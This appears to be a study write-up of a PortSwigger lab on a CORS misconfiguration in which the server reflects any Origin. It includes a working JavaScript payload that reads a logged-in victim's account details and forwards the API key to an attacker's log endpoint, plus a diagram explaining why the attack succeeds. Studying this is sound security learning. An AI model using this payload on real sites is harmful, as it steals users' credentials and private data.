# [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

> login the site and during the login there will be a request to the `/accountDetails`, in the response there is a header `Access-Control-Allow-Credentials: true` that indicates it might support `CORS`

- in Burp Repeater add to the request `Origin: https://example.com`
- in the response it should reflect that in as a header -> `Access-Control-Allow-Origin: https://example.com`

> any given `Origin: xyz` reflected in the response

> exploit ->

```
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open("get", "https://xxx.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location = "/log?key=" + this.responseText;
  }
</script>
```

- the `req.withCredentials = true;` in the request will tell the response should send the victim credentials what will set `Access-Control-Allow-Origin: https://www.expoit-serve.com`, otherwise the browser would block the `this.responseText`
- the `location = "/log?key=" + this.responseText;` is for the exploit server, the log page will get all the response text

> deliver it to the victim and then view the exploit, in the logs there will be the administrator api key (in this lab the admin will receive the exploit)

```
┌─────────────────────────────────────────────┐
│  1. Victim visits attacker's exploit page   │
│     (logged into lab in another tab)        │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  2. Script fires XHR to /accountDetails     │
│     withCredentials = true is set           │
└──────────────────────┬──────────────────────┘
                       │
          ┌────────────┴────────────┐
          ▼                         ▼
┌──────────────────────┐  ┌──────────────────────┐
│ 3a. Browser adds     │  │ 3b. Browser attaches │
│     Origin header    │  │     victim's cookies │
│                      │  │                      │
│ Origin:              │  │ Because              │
│ exploit-server.net   │  │ withCredentials=true │
└──────────┬───────────┘  └──────────┬───────────┘
           │                         │
           ▼                         ▼
┌──────────────────────┐  ┌──────────────────────┐
│ 4a. Server reflects  │  │ 4b. Server returns   │
│     the origin       │  │     secret data      │
│                      │  │                      │
│ ACAO:                │  │ Victim's API key     │
│ exploit-server.net   │  │ in response body     │
│ ACAC: true           │  │ (cookie identified)  │
└──────────┬───────────┘  └──────────┬───────────┘
           │                         │
           └────────────┬────────────┘
                        ▼
┌─────────────────────────────────────────────┐
│  5. Browser CORS check (the bottleneck)     │
│                                             │
│     Does ACAO match my origin?     YES      │
│     Is ACAC true?                  YES      │
│     → Allow JS to read response             │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  6. responseText handed to JS               │
│     reqListener callback fires              │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  7. location = "/log?key=" + responseText   │
│     Browser navigates to attacker's log     │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  8. Attacker reads log                      │
│     → Victim's API key captured             │
└─────────────────────────────────────────────┘
```

**Legend:**

- `ACAO` = `Access-Control-Allow-Origin` response header
- `ACAC` = `Access-Control-Allow-Credentials` response header

---

The exploit only works because **two separate conditions** are both met:

| Key                                      | Who controls it            | What it does                                                                       |
| ---------------------------------------- | -------------------------- | ---------------------------------------------------------------------------------- |
| `withCredentials = true`                 | **Attacker** (in JS)       | Tells browser to attach victim's cookies, so response contains _their_ secret data |
| `ACAO: <attacker origin>` + `ACAC: true` | **Server** (misconfigured) | Tells browser it's OK to let attacker's JS read the response                       |

Neither alone is enough. The server's bug (origin reflection) provides one key; the attacker's `withCredentials` provides the other.
